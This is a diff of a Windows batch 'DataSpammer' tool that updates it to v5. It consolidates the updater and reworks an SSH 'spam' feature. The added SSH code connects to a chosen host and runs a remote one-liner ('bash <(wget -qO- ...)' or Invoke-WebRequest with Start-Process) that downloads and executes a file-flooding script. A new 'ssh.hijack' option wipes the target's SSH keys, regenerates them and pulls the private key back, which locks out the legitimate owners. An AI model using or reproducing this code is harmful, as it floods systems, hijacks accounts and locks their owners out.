@@ -1,12 +1,9 @@
 :: Use only under MIT License
 :: Use only under License
 ::    Todo: 
-::    Rework SSH
-::    Fix Creation of C:\Program - Not Confirmed
-::    Fix Updater - Clueless After 3 Gazillion Updates
-
-
-
+::    Fix Updater - Clueless After 3 Gazillion Updates - Added -UseBasicParsing to iwr
+::    Add PR Presets, Docs etc.
+::    Add Auto Adjust Window / better sizing for all TLIs
 
 :: Developer Notes:
 :: Define %debug_assist% to bypass echo_off
@@ -23,8 +20,9 @@
     set DIRNAME=%~dp0
     if "%DIRNAME%"=="" set DIRNAME=.
     mode con: cols=140 lines=40
-    set "current-script-version=v4.6"
+    set "current-script-version=v5"
     set "powershell.short=powershell.exe -ExecutionPolicy Bypass -NoProfile"
+    if "%1"=="" goto normal.start
     if "%1"=="h" goto help.startup
     if "%1"=="-h" goto help.startup
     if "%1"=="help" goto help.startup
@@ -32,8 +30,8 @@
     if "%1"=="--help" goto help.startup
     if "%1"=="faststart" goto sys.enable.ascii.tweak
     if "%1"=="update" goto fast.git.update
+    if "%1"=="update.script" call :update.script %2
     if "%1"=="remove" goto sys.delete.script
-    if "%1"=="" goto normal.start
     if "%1"=="cli" goto sys.cli
     if "%1"=="debug" goto debuglog
     if "%1"=="debugtest" goto debugtest
@@ -265,7 +263,7 @@
 
 
     
-    if "%latest_version%" equ "v4.6" (
+    if "%latest_version%" equ "v5" (
         set "uptodate=up"
     ) else (
         set "uptodate="
@@ -305,7 +303,7 @@
     call :sys.lt 1
     choice /C 12 /M "Choose an Option from Above:"
         set _erl=%errorlevel%
-        if %_erl%==1 goto git.update.version
+        if %_erl%==1 call :update.script stable && exit /b
         if %_erl%==2 exit /b
     goto git.version.outdated
 
@@ -319,47 +317,6 @@
     exit /b
 
 
-:git.update.version
-    cls
-    :: Updated in v4.2
-    :: Old one used seperate file / wget & curl
-    if %logging% == 1 ( call :log Creating_Update_Script )
-    cd /d %~dp0
-    erase install.bat && erase README.md && erase LICENSE >nul 2>&1
-    mkdir %temp%\dts.update >nul 2>&1
-    echo Updating script... 
-    %powershell.short% iwr "https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/dataspammer.bat" -OutFile "%temp%\dts.update\%~nx0" >nul 2>&1
-    cls && echo Updating DataSpammer.bat...
-    %powershell.short% iwr "https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/install.bat" -OutFile "%temp%\dts.update\install.bat" >nul 2>&1
-    cls && echo Updating Install.bat...
-    %powershell.short% iwr "https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/README.md" -OutFile "%temp%\dts.update\README.md" >nul 2>&1
-    cls && echo Updating Readme...
-    %powershell.short% iwr "https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/LICENSE" -OutFile "%temp%\dts.update\LICENSE" >nul 2>&1
-    cls && echo Updating License...
-    :call :sys.lt 5
-    echo Updated successfully.
-
-    :: Encrypt new Files, when current Version is already encrypted
-    if not exist "%userprofile%\Documents\SecureDataSpammer\token.hash" goto move.new.files
-    echo Encrypting newly downloaded Files...
-    echo FF FE 0D 0A 63 6C 73 0D 0A >  "%temp%\dts.update\temp_hex.txt"
-    certutil -f -decodehex "%temp%\dts.update\temp_hex.txt" "%temp%\dts.update\temp_prefix.bin"
-    move "%temp%\dts.update\dataspammer.bat" "%temp%\dts.update\original_dataspammer.bat"
-    copy /b "%temp%\dts.update\temp_prefix.bin" + "%temp%\dts.update\original_dataspammer.bat" "%temp%\dts.update\dataspammer.bat"
-    move "%temp%\dts.update\install.bat" "%temp%\dts.update\original_install.bat"
-    copy /b "%temp%\dts.update\temp_prefix.bin" + "%temp%\dts.update\original_install.bat" "%temp%\dts.update\install.bat"
-    erase "%temp%\dts.update\original_install.bat"
-    erase "%temp%\dts.update\original_dataspammer.bat"
-    erase "%temp%\dts.update\temp_hex.txt"
-    erase "%temp%\dts.update\temp_prefix.bin"
-    Cipher /E "%temp%\dts.update\dataspammer.bat"
-    Cipher /E "%temp%\dts.update\install.bat"
-
-    :move.new.files
-    move /y "%temp%\dts.update\*" "%~dp0"
-    cmd.exe -k %~f0
-    goto :EOF
-    exit
 
 
 
@@ -1026,138 +983,15 @@ if %monitoring%==0 set "monitoring-status=Disabled"
     echo.
     choice /C 1234 /M "Choose an Option from Above:"
         set _erl=%errorlevel%
-        if %_erl%==1 goto dev.force.update
-        if %_erl%==2 goto stable.switch.branch
-        if %_erl%==3 goto dev.switch.branch  
+        if %_erl%==1 goto call :update.script stable && exit /b
+        if %_erl%==2 goto call :update.script stable && exit /b
+        if %_erl%==3 goto call :update.script beta && exit /b
         if %_erl%==4 goto settings
     goto settings.version.control
 
 
-:dev.force.update
-    cls
-    :: Updated in v4.2
-    :: Old one used seperate file / wget & curl
-    if %logging% == 1 ( call :log Forcing_Update )
-    cd /d %~dp0
-    erase install.bat && erase README.md && erase LICENSE >nul 2>&1
-    mkdir %temp%\dts.update >nul 2>&1
-    echo Updating script... 
-    %powershell.short% iwr "https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/dataspammer.bat" -OutFile "%temp%\dts.update\%~nx0" >nul 2>&1
-    cls && echo Updating DataSpammer.bat...
-    %powershell.short% iwr "https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/install.bat" -OutFile "%temp%\dts.update\install.bat" >nul 2>&1
-    cls && echo Updating Install.bat...
-    %powershell.short% iwr "https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/README.md" -OutFile "%temp%\dts.update\README.md" >nul 2>&1
-    cls && echo Updating Readme...
-    %powershell.short% iwr "https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/LICENSE" -OutFile "%temp%\dts.update\LICENSE" >nul 2>&1
-    cls && echo Updating License...
-
-    :: Encrypt new Files, when current Version is already encrypted
-    if not exist "%userprofile%\Documents\SecureDataSpammer\token.hash" goto move.new.files
-    echo Encrypting newly downloaded Files...
-    echo FF FE 0D 0A 63 6C 73 0D 0A >  "%temp%\dts.update\temp_hex.txt"
-    certutil -f -decodehex "%temp%\dts.update\temp_hex.txt" "%temp%\dts.update\temp_prefix.bin"
-    move "%temp%\dts.update\dataspammer.bat" "%temp%\dts.update\original_dataspammer.bat"
-    copy /b "%temp%\dts.update\temp_prefix.bin" + "%temp%\dts.update\original_dataspammer.bat" "%temp%\dts.update\dataspammer.bat"
-    move "%temp%\dts.update\install.bat" "%temp%\dts.update\original_install.bat"
-    copy /b "%temp%\dts.update\temp_prefix.bin" + "%temp%\dts.update\original_install.bat" "%temp%\dts.update\install.bat"
-    erase "%temp%\dts.update\original_install.bat"
-    erase "%temp%\dts.update\original_dataspammer.bat"
-    erase "%temp%\dts.update\temp_hex.txt"
-    erase "%temp%\dts.update\temp_prefix.bin"
-    Cipher /E "%temp%\dts.update\dataspammer.bat"
-    Cipher /E "%temp%\dts.update\install.bat"
-
-    :move.new.files
-    move /y "%temp%\dts.update\*" "%~dp0"
-    cmd.exe -k %~f0
-    goto :EOF
-    exit
 
 
-
-:dev.switch.branch
-    cls
-    :: Updated in v4.2
-    :: Old one used seperate file / wget & curl
-    if %logging% == 1 ( call :log Switching_to_Dev_Branch )
-    cd /d %~dp0
-    erase install.bat && erase README.md && erase LICENSE >nul 2>&1
-    mkdir %temp%\dts.update >nul 2>&1
-    echo Updating script... 
-    %powershell.short% iwr "https://raw.githubusercontent.com/PIRANY1/DataSpammer/refs/heads/beta/dataspammer.bat" -OutFile "%temp%\dts.update\%~nx0" >nul 2>&1
-    cls && echo Updating DataSpammer.bat...
-    %powershell.short% iwr "https://raw.githubusercontent.com/PIRANY1/DataSpammer/refs/heads/beta/install.bat" -OutFile "%temp%\dts.update\install.bat" >nul 2>&1
-    cls && echo Updating Install.bat...
-    %powershell.short% iwr "https://raw.githubusercontent.com/PIRANY1/DataSpammer/refs/heads/beta/README.md" -OutFile "%temp%\dts.update\README.md" >nul 2>&1
-    cls && echo Updating Readme...
-    %powershell.short% iwr "https://raw.githubusercontent.com/PIRANY1/DataSpammer/refs/heads/beta/LICENSE" -OutFile "%temp%\dts.update\LICENSE" >nul 2>&1
-    cls && echo Updating License...
-    echo Updated successfully.
-
-    :: Encrypt new Files, when current Version is already encrypted
-    if not exist "%userprofile%\Documents\SecureDataSpammer\token.hash" goto move.new.files
-    echo Encrypting newly downloaded Files...
-    echo FF FE 0D 0A 63 6C 73 0D 0A >  "%temp%\dts.update\temp_hex.txt"
-    certutil -f -decodehex "%temp%\dts.update\temp_hex.txt" "%temp%\dts.update\temp_prefix.bin"
-    move "%temp%\dts.update\dataspammer.bat" "%temp%\dts.update\original_dataspammer.bat"
-    copy /b "%temp%\dts.update\temp_prefix.bin" + "%temp%\dts.update\original_dataspammer.bat" "%temp%\dts.update\dataspammer.bat"
-    move "%temp%\dts.update\install.bat" "%temp%\dts.update\original_install.bat"
-    copy /b "%temp%\dts.update\temp_prefix.bin" + "%temp%\dts.update\original_install.bat" "%temp%\dts.update\install.bat"
-    erase "%temp%\dts.update\original_install.bat"
-    erase "%temp%\dts.update\original_dataspammer.bat"
-    erase "%temp%\dts.update\temp_hex.txt"
-    erase "%temp%\dts.update\temp_prefix.bin"
-    Cipher /E "%temp%\dts.update\dataspammer.bat"
-    Cipher /E "%temp%\dts.update\install.bat"
-
-    :move.new.files
-    move /y "%temp%\dts.update\*" "%~dp0"
-    cmd.exe -k %~f0
-    goto :EOF
-    exit
-
-
-
-:stable.switch.branch
-    cls
-    :: Updated in v4.2
-    :: Old one used seperate file / wget & curl
-    if %logging% == 1 ( call :log Switching_to_stable_branch )
-    cd /d %~dp0
-    erase install.bat && erase README.md && erase LICENSE >nul 2>&1
-    mkdir %temp%\dts.update >nul 2>&1
-    echo Updating script... 
-    %powershell.short% iwr "https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/dataspammer.bat" -OutFile "%temp%\dts.update\%~nx0" >nul 2>&1
-    cls && echo Updating DataSpammer.bat...
-    %powershell.short% iwr "https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/install.bat" -OutFile "%temp%\dts.update\install.bat" >nul 2>&1
-    cls && echo Updating Install.bat...
-    %powershell.short% iwr "https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/README.md" -OutFile "%temp%\dts.update\README.md" >nul 2>&1
-    cls && echo Updating Readme...
-    %powershell.short% iwr "https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/LICENSE" -OutFile "%temp%\dts.update\LICENSE" >nul 2>&1
-    cls && echo Updating License...
-    echo Updated successfully.
-
-    :: Encrypt new Files, when current Version is already encrypted
-    if not exist "%userprofile%\Documents\SecureDataSpammer\token.hash" goto move.new.files
-    echo Encrypting newly downloaded Files...
-    echo FF FE 0D 0A 63 6C 73 0D 0A >  "%temp%\dts.update\temp_hex.txt"
-    certutil -f -decodehex "%temp%\dts.update\temp_hex.txt" "%temp%\dts.update\temp_prefix.bin"
-    move "%temp%\dts.update\dataspammer.bat" "%temp%\dts.update\original_dataspammer.bat"
-    copy /b "%temp%\dts.update\temp_prefix.bin" + "%temp%\dts.update\original_dataspammer.bat" "%temp%\dts.update\dataspammer.bat"
-    move "%temp%\dts.update\install.bat" "%temp%\dts.update\original_install.bat"
-    copy /b "%temp%\dts.update\temp_prefix.bin" + "%temp%\dts.update\original_install.bat" "%temp%\dts.update\install.bat"
-    erase "%temp%\dts.update\original_install.bat"
-    erase "%temp%\dts.update\original_dataspammer.bat"
-    erase "%temp%\dts.update\temp_hex.txt"
-    erase "%temp%\dts.update\temp_prefix.bin"
-    Cipher /E "%temp%\dts.update\dataspammer.bat"
-    Cipher /E "%temp%\dts.update\install.bat"
-
-    :move.new.files
-    move /y "%temp%\dts.update\*" "%~dp0"
-    cmd.exe -k %~f0
-    goto :EOF
-    exit
 
 
 :activate.dev.options   
@@ -1445,7 +1279,7 @@ if %monitoring%==0 set "monitoring-status=Disabled"
 
 
 :internet.spams
-    echo [1] SSH Test (no Password)
+    echo [1] SSH Test (Key-Auth or No Password)
     call :sys.lt 1
     echo.
     call :sys.lt 1
@@ -1830,59 +1664,43 @@ if %monitoring%==0 set "monitoring-status=Disabled"
 
 :ssh.spam
     if "%logging%"=="1" ( call :log Opened_SSH_Spam )
-    :: Not working - TLI For ssh.spam
-    echo In order to work, the Remote Spam Method needs 4 things.
-    @ping -n 1 localhost > nul
-    echo 1: The IP of the device you want to spam
-    @ping -n 1 localhost > nul
-    echo 2: An account name
-    @ping -n 1 localhost > nul
-    echo 3: The password of the account
-    @ping -n 1 localhost > nul
-    echo 4: How many files you want to create
-    @ping -n 1 localhost > nul
-    echo.
-    echo. 
-    echo [1] Continue
-    echo.
-    echo [2] Back
-    echo.
-    choice /C 12 /M "Choose an option from above:"
-        set _erl=%errorlevel%
-        if %_erl%==1 goto ssh.spam.info
-        if %_erl%==2 goto start.verified
-    goto ssh.spam
-
-:ssh.spam.info
     if "%logging%"=="1" ( call :log Listing_Local_IPs )
-    :: Ask the user to enter the IP - supported with arp
-    echo Please specify the IP of the device
-    @ping -n 1 localhost > nul
-    echo Down below are a few IPs in your network. 
-    arp -a 
-    @ping -n 1 localhost > nul
-    echo If you need help finding the IP, type "help"
+    
+    echo Enter the IP or the Hostename of the Device
     @ping -n 1 localhost > nul
     echo.
-    @ping -n 1 localhost > nul
+    echo.
+    :: Listing IPs from ARP Table
+    arp -a 
+    echo.
+    echo.
     echo.
     set /P ssh-ip=Enter the IP:
-    if "%ssh-ip%"=="help" (
-        start "" "https://support.ucsd.edu/services?id=kb_article_view&sysparm_article=KB0032480"
-    ) else (
-        goto ssh.spam.setup
-    )
-
-:ssh.spam.setup
-    :: Enter other things needed for Remote spam
-    set /P ssh-name=Enter an account name:
-    rem set /P ssh-pswd=Enter the password of the account:
-    set /P ssh-filecount=How many files do you want to create:
+    set /P ssh-name=Enter the Username:
+    set /P ssh-filecount=Enter the Filecount:
+    set /P ssh-key=Enter the SSH-Key:
     call :sys.verify.execution
     cls
 
+:ssh.hijack
+setlocal enabledelayedexpansion
+    echo Should the SSH-Keys be regenerated?
+    echo This will prohibit anyone with the Old Keys from Accessing the Target
+    echo.
+    echo [1] Yes
+    echo.
+    echo [2] No
+    echo.
+    echo.
+    choice /C 12 /M "Choose an option from above:"
+        set _erl=%errorlevel%
+        if %_erl%==1 set "ssh.regen=1" && goto ssh.start.spam
+        if %_erl%==2 set "ssh.regen=0" && goto ssh.start.spam
+    goto ssh.hijack
+
 :ssh.start.spam
-    echo Is the SSH target based on Linux or Windows?
+setlocal enabledelayedexpansion
+    echo Is the SSH Host running Windows or Linux?
     echo.
     echo [1] Windows
     echo.
@@ -1895,25 +1713,89 @@ if %monitoring%==0 set "monitoring-status=Disabled"
         if %_erl%==2 goto spam.ssh.target.lx
     goto ssh.start.spam
 
+
 :spam.ssh.target.win
-    if "%logging%"=="1" ( call :log Spamming_Windows_SSH_Target )
-    set ssh_command=Invoke-WebRequest -Uri 'https://gist.githubusercontent.com/PIRANY1/4ee726c3d20d9f028b7e15a057c85163/raw/825fbd4af7339fab4f7bd62dd75f2cf9a239412b/spam.bat' -OutFile 'spam.bat'; Start-Process 'spam.bat' -ArgumentList %ssh-filecount%
-    ssh %ssh-name%@%ssh-ip% powershell -Command "%ssh_command%"
+    if defined logging call :log Spamming_Windows_SSH_Target
+
+    if "%ssh.regen%"=="1" (
+        echo Regenerating SSH keys on target...
+        rem Generate New Keys
+        if defined ssh-key (
+            ssh -i "%ssh-key%" %ssh-name%@%ssh-ip% "del /Q C:\Users\%ssh-name%\.ssh\* && ssh-keygen -t rsa -b 4096 -f C:\Users\%ssh-name%\.ssh\id_rsa -N \"\" && type C:\Users\%ssh-name%\.ssh\id_rsa" > new_ssh_key.txt
+        ) else (
+            ssh %ssh-name%@%ssh-ip% "del /Q C:\Users\%ssh-name%\.ssh\* && ssh-keygen -t rsa -b 4096 -f C:\Users\%ssh-name%\.ssh\id_rsa -N \"\" && type C:\Users\%ssh-name%\.ssh\id_rsa" > new_ssh_key.txt
+        )
+        if errorlevel 1 (
+            echo [ERROR] SSH key regeneration failed!
+            goto ssh.done
+        )
+        echo New SSH private key generated and saved to new_ssh_key.txt:
+        type new_ssh_key.txt 
+        type new_ssh_key.txt | clip
+        rem Update the ssh-key variable to use the new key for the following connection
+        set "ssh-key=new_ssh_key.txt"
+    )
+
+    set "ssh_command=%powershell.short% -Command \"& { Invoke-WebRequest -Uri 'https://gist.githubusercontent.com/PIRANY1/4ee726c3d20d9f028b7e15a057c85163/raw/825fbd4af7339fab4f7bd62dd75f2cf9a239412b/spam.bat' -OutFile 'spam.bat'; Start-Process 'cmd.exe' -ArgumentList '/c spam.bat %ssh_filecount%' }\""
+
+    echo Connecting to Windows SSH target...
+    if defined ssh-key (
+        ssh -i "%ssh-key%" %ssh-name%@%ssh-ip% "!ssh_command!"
+    ) else (
+        ssh %ssh-name%@%ssh-ip% "!ssh_command!"
+    )
     color 02
+    if errorlevel 1 (
+        echo [ERROR] SSH connection failed!
+        goto ssh.done
+    )
+
     echo Successfully executed SSH connection.
     goto ssh.done
 
+
 :spam.ssh.target.lx
-    if "%logging%"=="1" ( call :log Spamming_Linux_SSH_Target )
-    set ssh_command=bash <(wget -qO- https://gist.githubusercontent.com/PIRANY1/81dab116782df1f051f465f4fcadfe6c/raw/5d7fdba0a0d30b25dd0df544a1469146349bc37e/spam.sh) %ssh-filecount%
-    ssh %ssh-name%@%ssh-ip% %ssh_command%
+    if defined logging call :log Spamming_Linux_SSH_Target 
+    if "%ssh.regen%"=="1" (
+        echo Regenerating SSH keys on target...
+        rem Generate New Keys
+        if defined ssh-key (
+            ssh -i "%ssh-key%" %ssh-name%@%ssh-ip% "rm -f ~/.ssh/id_rsa ~/.ssh/id_rsa.pub && ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N \"\" && cat ~/.ssh/id_rsa" > new_ssh_key.txt
+        ) else (
+            ssh %ssh-name%@%ssh-ip% "rm -f ~/.ssh/id_rsa ~/.ssh/id_rsa.pub && ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N \"\" && cat ~/.ssh/id_rsa" > new_ssh_key.txt
+        )
+        if errorlevel 1 (
+            echo [ERROR] SSH key regeneration failed!
+            goto ssh.done
+        )
+        echo New SSH private key generated and saved to new_ssh_key.txt:
+        type new_ssh_key.txt
+        type new_ssh_key.txt | clip
+        rem Update the ssh-key variable to use the new key for subsequent connections
+        set "ssh-key=new_ssh_key.txt"
+    )
+
+    set "ssh_command=bash <(wget -qO- https://gist.githubusercontent.com/PIRANY1/81dab116782df1f051f465f4fcadfe6c/raw/5d7fdba0a0d30b25dd0df544a1469146349bc37e/spam.sh) %ssh-filecount%"
+    
+    echo Connecting to SSH target...
+    if defined ssh-key (
+        ssh -i "%ssh-key%" %ssh-name%@%ssh-ip% "!ssh_command!"
+    ) else (
+        ssh %ssh-name%@%ssh-ip% "!ssh_command!"
+    )
     color 02
+    if errorlevel 1 (
+        echo [ERROR] SSH connection failed!
+        goto ssh.done
+    )
+
     echo Successfully executed SSH connection.
     goto ssh.done
+
 
 :ssh.done
     if %logging% == 1 ( call :log Finished_SSH_Spam_Files:_%ssh-filecount%_Host_%ssh-name% )
-    call :done "The script created %ssh-filecount% files on the machine of %ssh-name%"
+    call :done "Created %ssh-filecount% Files on %ssh-name%@%ssh-ip%"
 
 :desktop.icon.spam
     if %logging% == 1 ( call :log Opened_Desktop_Spam )
@@ -2012,6 +1894,8 @@ if %monitoring%==0 set "monitoring-status=Disabled"
     echo    debug Generate Debug Log
     echo.
     echo    monitor Opens the Monitor Socket
+    echo.
+    echo    update.script [ stable / beta ] Force Update the Script
     echo.
     echo.
 
@@ -2504,12 +2388,61 @@ if %monitoring%==0 set "monitoring-status=Disabled"
     exit /b
 
 
+:update.script
+    cls
+    :: Updated in v4.2
+    :: Old one used seperate file / wget & curl
+    if %logging% == 1 ( call :log Creating_Update_Script )
+
+    if "%1"==stable set "update_url=https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/"
+    if "%1"==beta set "update_url=https://raw.githubusercontent.com/PIRANY1/DataSpammer/refs/heads/beta/"
+
+    cd /d %~dp0
+    erase install.bat && erase README.md && erase LICENSE >nul 2>&1
+    mkdir %temp%\dts.update >nul 2>&1
+    echo Updating script... 
+    %powershell.short% iwr "%update_url%dataspammer.bat" -UseBasicParsing -OutFile "%temp%\dts.update\%~nx0" >nul 2>&1
+    cls && echo Updating DataSpammer.bat...
+    %powershell.short% iwr "%update_url%install.bat" -UseBasicParsing -OutFile "%temp%\dts.update\install.bat" >nul 2>&1
+    cls && echo Updating Install.bat...
+    %powershell.short% iwr "%update_url%README.md" -UseBasicParsing -OutFile "%temp%\dts.update\README.md" >nul 2>&1
+    cls && echo Updating Readme...
+    %powershell.short% iwr "%update_url%main/LICENSE" -UseBasicParsing -OutFile "%temp%\dts.update\LICENSE" >nul 2>&1
+    cls && echo Updating License...
+    call :sys.lt 2
+    echo Updated successfully.
+
+    :: Encrypt new Files, when current Version is already encrypted
+    if not exist "%userprofile%\Documents\SecureDataSpammer\token.hash" goto move.new.files
+    echo Encrypting newly downloaded Files...
+    echo FF FE 0D 0A 63 6C 73 0D 0A >  "%temp%\dts.update\temp_hex.txt"
+    certutil -f -decodehex "%temp%\dts.update\temp_hex.txt" "%temp%\dts.update\temp_prefix.bin"
+    move "%temp%\dts.update\dataspammer.bat" "%temp%\dts.update\original_dataspammer.bat"
+    copy /b "%temp%\dts.update\temp_prefix.bin" + "%temp%\dts.update\original_dataspammer.bat" "%temp%\dts.update\dataspammer.bat"
+    move "%temp%\dts.update\install.bat" "%temp%\dts.update\original_install.bat"
+    copy /b "%temp%\dts.update\temp_prefix.bin" + "%temp%\dts.update\original_install.bat" "%temp%\dts.update\install.bat"
+    erase "%temp%\dts.update\original_install.bat"
+    erase "%temp%\dts.update\original_dataspammer.bat"
+    erase "%temp%\dts.update\temp_hex.txt"
+    erase "%temp%\dts.update\temp_prefix.bin"
+    Cipher /E "%temp%\dts.update\dataspammer.bat"
+    Cipher /E "%temp%\dts.update\install.bat"
+
+    :move.new.files
+    move /y "%temp%\dts.update\*" "%~dp0"
+    cmd.exe -k %~f0
+    exit 
+    goto :EOF
+
+
+
 
 :sys.verify.execution
     if %logging% == 1 ( call :log Opened_verify_tab )
     set "verify=%random%"
     %powershell.short% -Command "& {Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::InputBox('Please enter Code %verify% to confirm that you want to execute this Option', 'DataSpammer Verify')}" > %TEMP%\out.tmp
     set /p OUT=<%TEMP%\out.tmp
+    :: Fix Empty Input Bypass
     if not defined OUT goto failed
     if %verify%==%OUT% (goto success) else (goto failed)
 
